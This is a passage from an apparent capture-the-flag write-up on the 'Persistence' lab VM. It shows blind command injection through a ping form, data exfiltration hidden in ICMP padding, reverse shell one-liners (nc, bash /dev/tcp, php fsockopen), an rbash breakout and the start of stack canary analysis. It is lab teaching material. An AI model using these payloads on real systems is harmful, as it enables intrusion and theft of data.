&lt;p&gt;With this information now gathered, it was time to pull out one of my favorite tools, &lt;code&gt;wfuzz&lt;/code&gt;! With &lt;code&gt;wfuzz&lt;/code&gt;, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.&lt;/p&gt;

&lt;p&gt;My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending &lt;em&gt;.php&lt;/em&gt; to my &lt;code&gt;FUZZ&lt;/code&gt; keyword:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.104/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

00434:  C=200     12 L        28 W      357 Ch    &amp;quot; - debug&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay. &lt;code&gt;wfuzz&lt;/code&gt; is stupidly fast and finished the above in like 4 seconds. Browsing to &lt;a href=&#34;http://192.168.56.101/debug.php&#34;&gt;http://192.168.56.101/debug.php&lt;/a&gt; showed us a input field labeled &amp;ldquo;Ping address:&amp;rdquo; and a submit button&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/persistence_debug_php.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&amp;ldquo;Command injection?&amp;rdquo;, was the first thought here.&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection&#34;&gt;blind command injection&lt;/h2&gt;

&lt;p&gt;I started by entering a valid IP address that had &lt;code&gt;tcpdump&lt;/code&gt; listening to test if the script is actually running a ping like it says &amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
07:46:15.503023 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
07:46:15.503040 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
07:46:16.503729 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
07:46:16.503768 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
07:46:17.503180 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
07:46:17.503260 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
07:46:18.502811 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
07:46:18.502842 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; which it was. What is important to note here is that we have 4 echo requests.&lt;/p&gt;

&lt;p&gt;I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field &lt;code&gt;;exit 0;&lt;/code&gt; caused the HTTP request to complete almost instantly while no ping requests were observed on the &lt;code&gt;tcpdump&lt;/code&gt;. This had me certain that this field was vulnerable to a command injection vulnerability.&lt;/p&gt;

&lt;p&gt;This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.&lt;/p&gt;

&lt;p&gt;I tried the usual culprits: &lt;code&gt;nc &amp;lt;ip&amp;gt;  &amp;lt;port&amp;gt; -e /bin/bash&lt;/code&gt;; &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;; &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;&amp;lt;ip&amp;gt;&amp;quot;,&amp;lt;port&amp;gt;);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection-file-enumeration&#34;&gt;blind command injection - file enumeration&lt;/h2&gt;

&lt;p&gt;Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.&lt;/p&gt;

&lt;p&gt;I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash &lt;code&gt;if [ -f /file ]&lt;/code&gt; statement, with a single ping for success, and 2 pings for a failure. The string for the &lt;code&gt;debug.php&lt;/code&gt; input field looked something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Submitting the above input presented me with a single ping, confirming that &lt;code&gt;/bin/sh&lt;/code&gt; exists.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
08:15:53.557994 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
08:15:53.558011 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking for something like &lt;code&gt;/bin/sh2&lt;/code&gt; responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as &lt;code&gt;/bin/nc&lt;/code&gt;, I may end up with greater success of a shell!&lt;/p&gt;

&lt;p&gt;I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  &lt;code&gt;/usr/bin/python&lt;/code&gt; appeared to be available! I really like python so this had me really happy.&lt;/p&gt;

&lt;h2 id=&#34;blind-command-injection-port-scanner&#34;&gt;blind command injection - port scanner&lt;/h2&gt;

&lt;p&gt;I tested a few commands with &lt;code&gt;python -c&lt;/code&gt;, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.&lt;/p&gt;

&lt;p&gt;No. Luck.&lt;/p&gt;

&lt;p&gt;I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &amp;lsquo;prober&amp;rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my &lt;code&gt;tcpdump&lt;/code&gt; for any tcp traffic comming from this host:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
for port in xrange(1, 65535):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    sock.connect_ex((&amp;quot;192.168.56.102&amp;quot;, port))
    sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using my blind command injection, I echoed this content to &lt;code&gt;/tmp/probe.py&lt;/code&gt; via the input field, and then in a subsequent request, ran it using &lt;code&gt;python /tmp/probe.py&lt;/code&gt;. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;data-exfiltration&#34;&gt;data exfiltration&lt;/h2&gt;

&lt;p&gt;With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the &lt;code&gt;debug.php&lt;/code&gt; file on disk and tried to echo a PHP web shell to the same directory. This also failed.&lt;/p&gt;

&lt;p&gt;So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.&lt;/p&gt;

&lt;p&gt;Eventually, I came across the &lt;code&gt;-p&lt;/code&gt; argument for ping after reading &lt;a href=&#34;http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html&#34;&gt;this&lt;/a&gt; blogpost. From &lt;code&gt;man 8 ping&lt;/code&gt; we read:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p pattern
   You may specify up to 16 ``pad&#39;&#39; bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff&#39;&#39; will cause the sent packet to be filled with all ones.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So that changes things. I quickly confirmed that we have &lt;code&gt;xxd&lt;/code&gt; available using my previous enumeration method and we did. Great.&lt;/p&gt;

&lt;p&gt;I fired up tcpdump with the &lt;code&gt;-X&lt;/code&gt; flag to show me the packet contents, and tested it out with the following payload for the &lt;code&gt;id&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the &lt;code&gt;tcpdump&lt;/code&gt; side of things&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
09:18:14.439222 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.439248 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64
    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.440365 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.440382 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64
    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.441191 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
09:18:14.441198 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64
    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&amp;gt;..8f
    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mind. Blown.&lt;/p&gt;

&lt;p&gt;In case you don&amp;rsquo;t see it, we have extracts of the &lt;code&gt;id&lt;/code&gt; command in the request/response packets like &lt;em&gt;98(nginx).grid=4&lt;/em&gt;. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact &lt;strong&gt;something&lt;/strong&gt; to work with!&lt;/p&gt;

&lt;p&gt;I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; sniff(filter=&amp;quot;icmp[icmptype] == 8 and host 192.168.56.104&amp;quot;, prn=lambda x: x.load)
ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
ؤT
   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
ؤT�(nginx)
oups=498(nginx)
oups=498(nginx)
oups=498
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;sysadmin-tool&#34;&gt;sysadmin-tool&lt;/h2&gt;

&lt;p&gt;So with actual output to work with, I can almost say I have shell, however, it&amp;rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.&lt;/p&gt;

&lt;p&gt;At one stage I ran &lt;code&gt;ls&lt;/code&gt; as the command trying to see if there was anything in the web path that I may not have found yet. A file called &lt;em&gt;sysadmin-tool&lt;/em&gt; was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i &#39;s/^#//&#39; /etc/sysconfig/iptables
/sbin/iptables-restore &amp;lt; /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0017s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay! SSH.&lt;/p&gt;

&lt;h2 id=&#34;shell-and-breakout-as-avida&#34;&gt;shell and breakout as avida&lt;/h2&gt;

&lt;p&gt;Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host &#39;192.168.56.104 (192.168.56.104)&#39; can&#39;t be established.
RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.56.104&#39; (RSA) to the list of known hosts.
avida@192.168.56.104&#39;s password:    # dollars
Last login: Thu Sep 18 05:57:30 2014
-rbash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Op success. Or is it? I immediately noticed the prompt as &lt;code&gt;rbash&lt;/code&gt;, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a &lt;code&gt;/&lt;/code&gt; in them.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/&#39; in command names
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the next logical step was to attempt &amp;lsquo;breaking out&amp;rsquo; of this shell so that I can have a better look around. I was able to cat say &lt;code&gt;/etc/passwd&lt;/code&gt;, but that only gets you &lt;em&gt;that&lt;/em&gt; far :P&lt;/p&gt;

&lt;p&gt;After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic &lt;code&gt;vi&lt;/code&gt; &lt;code&gt;:shell&lt;/code&gt; breakout. Eventually (and out of desperation), I focussed my attention to &lt;code&gt;ftp&lt;/code&gt;. Opening &lt;code&gt;ftp&lt;/code&gt;, and typing &lt;code&gt;help&lt;/code&gt; at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ ftp
ftp&amp;gt; !
+rbash-4.1$ /bin/bash
bash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I got dropped into another &lt;code&gt;rbash&lt;/code&gt; shell, however this time with a +. So, I went for &lt;code&gt;/bin/bash&lt;/code&gt; and&amp;hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!&lt;/p&gt;

&lt;h2 id=&#34;the-wopr-game&#34;&gt;the wopr game&lt;/h2&gt;

&lt;p&gt;During the enumeration done while still stuck with &lt;code&gt;rbash&lt;/code&gt;, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of &lt;code&gt;netstat&lt;/code&gt;. Opening a telnet session to this port presented you with a &amp;lsquo;game&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; yes!
[+] yeah, I don&#39;t think so
[+] bye!
Connection closed by foreign host.
bash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I asked really, really nicely, but no matter how polite I was, it would just not let me play!&lt;/p&gt;

&lt;p&gt;Further inspection showed that the game was possibly run as root from &lt;code&gt;/usr/local/bin/wopr&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ps -ef | grep wopr
root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
root      1577  1005  0 06:43 ?        00:00:00 [wopr] &amp;lt;defunct&amp;gt;
avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr

bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;wopr&lt;/code&gt; was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, hex encode the file
bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
[... snip ...]
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$

# next, I copied the xxd output from the persistence terminal
# and pasted it into a file called wopr.xxd. Then reverted it
# and redirected the output to `wopr`
root@kali:~# cat wopr.xxd | xxd -r -p &amp;gt; wopr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;wopr-stack-smashing&#34;&gt;wopr, stack smashing&lt;/h2&gt;

&lt;p&gt;Poking around the binary, I mostly used &lt;code&gt;gdb&lt;/code&gt; along with &lt;a href=&#34;https://github.com/longld/peda&#34;&gt;peda&lt;/a&gt;.
Checksec revealed that this binary was compiled with quite a few security features built in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.&lt;/p&gt;

&lt;p&gt;With all of that in mind, I ran the binary with the &lt;code&gt;r&lt;/code&gt; command, and made a new telnet session to it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ r
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
[New process 26936]
[Inferior 2 (process 26936) exited normally]
Warning: not running or target is remote
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a &lt;code&gt;fork()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
Dump of assembler code for function main:
    [.. snip ..]
   0x080489fd &amp;lt;+543&amp;gt;:   mov    DWORD PTR [esp],0x8048cb2
   0x08048a04 &amp;lt;+550&amp;gt;:   call   0x804866c &amp;lt;puts@plt&amp;gt;
   0x08048a09 &amp;lt;+555&amp;gt;:   call   0x804867c &amp;lt;fork@plt&amp;gt; # &amp;lt;--
   0x08048a0e &amp;lt;+560&amp;gt;:   test   eax,eax
   0x08048a10 &amp;lt;+562&amp;gt;:   jne    0x8048b0e &amp;lt;main+816&amp;gt;
   0x08048a16 &amp;lt;+568&amp;gt;:   mov    DWORD PTR [esp+0x8],0x21
   0x08048a1e &amp;lt;+576&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048cc8
   0x08048a26 &amp;lt;+584&amp;gt;:   mov    eax,DWORD PTR [ebp-0x22c]
   0x08048a2c &amp;lt;+590&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048a2f &amp;lt;+593&amp;gt;:   call   0x804858c &amp;lt;write@plt&amp;gt;
    [.. snip ..]
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Why is the &lt;code&gt;fork()&lt;/code&gt; so important!? We will see in a bit just hang on. :)&lt;/p&gt;

&lt;p&gt;So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D&lt;/p&gt;

&lt;p&gt;Sending 30 x A&amp;rsquo;s results in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ [+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
wopr[0x8048ad6]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
wopr[0x80486e1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 1184792    wopr
08049000-0804a000 r--p 00000000 08:01 1184792    wopr
0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p 00000000 00:00 0
b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p 00000000 00:00 0
b7fde000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it looks like we may have a &lt;a href=&#34;http://en.wikipedia.org/wiki/Stack_buffer_overflow&#34;&gt;buffer overflow&lt;/a&gt; here. What is important though is the backtrace shows that the last fail was in &lt;code&gt;__fortify_fail&lt;/code&gt;. &lt;code&gt;__fortify_fail&lt;/code&gt; is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the &lt;code&gt;checksec&lt;/code&gt; output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.&lt;/p&gt;

&lt;p&gt;But lets not stop there. I continued to place more A&amp;rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&amp;rsquo;s, the backtrace had a full 4 bytes of 41.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
[0x41414141]        #&amp;lt;-- EIP?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Was this where EIP was?
With the debugging we have done thus far, lets assume that the stack layout looks something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;

[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]

- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;wopr-stack-canary-bruteforce&#34;&gt;wopr - stack canary bruteforce&lt;/h2&gt;

&lt;p&gt;This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.&lt;/p&gt;

&lt;p&gt;A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://phrack.org/issues/67/13.html&#34;&gt;Phrack Issue 67&lt;/a&gt;&lt;/li&gt;
